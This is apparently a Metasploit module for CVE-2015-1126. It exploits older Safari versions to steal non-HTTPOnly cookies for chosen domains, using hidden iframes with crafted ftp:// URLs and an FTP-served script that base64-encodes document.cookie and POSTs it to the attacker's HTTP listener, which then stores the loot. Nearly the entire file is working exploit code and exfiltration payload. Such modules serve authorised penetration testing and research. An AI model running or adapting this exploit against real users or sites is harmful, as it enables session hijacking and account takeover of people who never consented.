##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/service_manager'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::FtpServer
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Apple OSX/iOS/Windows Safari Non-HTTPOnly Cookie Theft',
      'Description' => %q{
        A vulnerability exists in versions of OSX, iOS, and Windows Safari released
        before April 8, 2015 that allows the non-HTTPOnly cookies of any
        domain to be stolen.
      },
      'License'     => MSF_LICENSE,
      'Author'      => [
        'Jouko Pynnonen', # Initial discovery and disclosure
        'joev',           # msf module
      ],
      'References'  => [
        [ 'CVE', '2015-1126' ],
        [ 'URL', 'https://seclists.org/fulldisclosure/2015/Apr/30' ]
      ],
      'Actions'        => [ [ 'WebServer' ] ],
      'PassiveActions' => [ 'WebServer' ],
      'DefaultAction'  => 'WebServer',
      'DisclosureDate' => 'Apr 8 2015'
    ))

    register_options([
      OptString.new('URIPATH', [false, 'The URI to use for this exploit (default is random)']),
      OptPort.new('SRVPORT',   [true, 'The local port to use for the FTP server', 5555 ]),
      OptPort.new('HTTPPORT',  [true, 'The HTTP server port', 8080]),
      OptString.new('TARGET_DOMAINS', [
        true,
        'The comma-separated list of domains to steal non-HTTPOnly cookies from.',
        'apple.com,example.com'
      ])
    ])
  end


  #
  # Start the FTP and HTTP server
  #
  def run
    start_service
    print_status("Local FTP: #{lookup_lhost}:#{datastore['SRVPORT']}")
    start_http
    @http_service.wait
  end


  #
  # Handle the HTTP request and return a response.  Code borrowed from:
  # msf/core/exploit/http/server.rb
  #
  def start_http(opts={})
    # Ensture all dependencies are present before initializing HTTP
    use_zlib

    comm = datastore['ListenerComm']
    if comm.to_s == 'local'
      comm = ::Rex::Socket::Comm::Local
    else
      comm = nil
    end

    # Default the server host / port
    opts = {
      'ServerHost' => datastore['SRVHOST'],
      'ServerPort' => datastore['HTTPPORT'],
      'Comm'       => comm
    }.update(opts)

    # Start a new HTTP server
    @http_service = Rex::ServiceManager.start(
      Rex::Proto::Http::Server,
      opts['ServerPort'].to_i,
      opts['ServerHost'],
      datastore['SSL'],
      {
        'Msf'        => framework,
        'MsfExploit' => self,
      },
      opts['Comm'],
      datastore['SSLCert']
    )

    @http_service.server_name = datastore['HTTP::server_name']

    # Default the procedure of the URI to on_request_uri if one isn't
    # provided.
    uopts = {
      'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
      'Path' => resource_uri
    }.update(opts['Uri'] || {})

    proto = (datastore['SSL'] ? 'https' : 'http')
    print_status("Using URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}")

    if opts['ServerHost'] == '0.0.0.0'
      print_status(" Local IP: #{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{opts['ServerPort']}#{uopts['Path']}")
    end

    # Add path to resource
    @service_path = uopts['Path']
    @http_service.add_resource(uopts['Path'], uopts)
  end

  #
  # Lookup the right address for the client
  #
  def lookup_lhost(c=nil)
    # Get the source address
    if datastore['SRVHOST'] == '0.0.0.0'
      Rex::Socket.source_address( c || '50.50.50.50')
    else
      datastore['SRVHOST']
    end
  end

  #
  # Handle the FTP RETR request. This is where we transfer our actual malicious payload
  #
  def on_client_command_retr(c, arg)
    conn = establish_data_connection(c)
    unless conn
      c.put("425 can't build data connection\r\n")
      return
    end

    print_status('Connection for file transfer accepted')
    c.put("150 Connection accepted\r\n")

    # Send out payload
    conn.put(exploit_html)
    c.put("226 Transfer complete.\r\n")
    conn.close
  end

  #
  # Kill HTTP/FTP (shut them down and clear resources)
  #
  def cleanup
    super

    # clear my resource, deregister ref, stop/close the HTTP socket
    begin
      @http_service.remove_resource(@uri_path)
      @http_service.deref
      @http_service.stop
      @http_service.close
      @http_service = nil
    rescue
    end
  end


  #
  # Ensures that gzip can be used.  If not, an exception is generated.  The
  # exception is only raised if the DisableGzip advanced option has not been
  # set.
  #
  def use_zlib
    unless Rex::Text.zlib_present? || !datastore['HTTP::compression']
      fail_with(Failure::Unknown, "zlib support was not detected, yet the HTTP::compression option was set.  Don't do that!")
    end
  end


  #
  # Returns the configured (or random, if not configured) URI path
  #
  def resource_uri
    return @uri_path if @uri_path

    @uri_path = datastore['URIPATH'] || Rex::Text.rand_text_alphanumeric(8+rand(8))
    @uri_path = '/' + @uri_path if @uri_path !~ /^\//
    @uri_path
  end


  #
  # Handle HTTP requets and responses
  #
  def on_request_uri(cli, request)
    if request.method.downcase == 'post'
      json = JSON.parse(request.body)
      domain = json['domain']
      cookie = Rex::Text.decode_base64(json['p']).to_s
      if cookie.length == 0
        print_error("#{cli.peerhost}: No cookies found for #{domain}")
      else
        file = store_loot(
          "cookie_#{domain}", 'text/plain', cli.peerhost, cookie, 'cookie', 'Stolen cookies'
        )
        print_good("#{cli.peerhost}: Cookies stolen for #{domain} (#{cookie.bytes.length} bytes): ")
        print_good(file)
      end
      send_response(cli, 200, 'OK', '')
    else
      domains = datastore['TARGET_DOMAINS'].split(',')
      iframes = domains.map do |domain|
        %Q|<iframe style='position:fixed;top:-99999px;left:-99999px;height:0;width:0;'
                src='ftp://user%40#{lookup_lhost}%3A#{datastore['SRVPORT']}%2Findex.html%23@#{domain}/'>
        </iframe>|
      end

      html = <<-HTML
        <html>
        <body>
          #{iframes.join}
        </body>
        </html>
      HTML

      send_response(cli, 200, 'OK', html)
    end
  end

  #
  # Create an HTTP response and then send it
  #
  def send_response(cli, code, message='OK', html='')
    proto = Rex::Proto::Http::DefaultProtocol
    res = Rex::Proto::Http::Response.new(code, message, proto)
    res['Content-Type'] = 'text/html'
    res.body = html

    cli.send_response(res)
  end

  def exploit_html
    <<-HTML
    <html><body>
    <script>
    var p = window.btoa(document.cookie);
    var x = new XMLHttpRequest();
    x.open('POST', "http://#{lookup_lhost}:#{datastore['HTTPPORT']}#{resource_uri}")
    x.setRequestHeader('Content-type', 'text/plain');
    x.send(JSON.stringify({p: p, domain: document.domain}));
    </script>
    </body></html>
    HTML
  end

  def grab_key
    @grab_key ||= Rex::Text.rand_text_alphanumeric(8)
  end
end
